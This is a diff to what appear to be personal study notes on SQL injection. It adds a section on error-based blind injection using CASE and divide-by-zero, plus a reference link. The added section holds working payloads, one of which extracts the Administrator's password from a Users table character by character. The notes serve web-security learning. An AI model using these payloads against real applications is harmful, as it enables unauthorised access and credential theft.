@@ -225,6 +225,21 @@ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator')
 
 If we have a welcome back message, it mean the first letter is 's'.
 
+## Inducing conditional responses by triggering SQL errors
+
+If the application does not behave differently with boolean conditions, it's often possible to induce the app to return conditional responses by **triggering SQL errors**.
+
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+
+We use the CASE keyword to test a condition and return different expressions depending on whether the expression is _true_. With the first input, CASE = 'a' and do not cause any error, but with the second input, it's a divide by zero which cause an error. Assuming the error causes some difference in the HTTP response, we can exploit this :
+
+```
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+
 - - -
 
 ### Usefull links
@@ -232,5 +247,6 @@ If we have a welcome back message, it mean the first letter is 's'.
 - [SQL Injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [SQL Injection](https://portswigger.net/web-security/sql-injection)
 - [Columns of the Information Schema](https://www.postgresql.org/docs/12/infoschema-columns.html)
+- [Blind SQL Injection](https://repository.root-me.org/Exploitation%20-%20Web/FR%20-%20Blind%20SQL%20injection.pdf?_gl=1*1bdo6kh*_ga*MTMzMTU4NDg3Ny4xNjU1NjM5Mjg2*_ga_SRYSKX09J7*MTY1NTYzOTI4NS4xLjEuMTY1NTY0MDg1OS4w)
 
 - - -
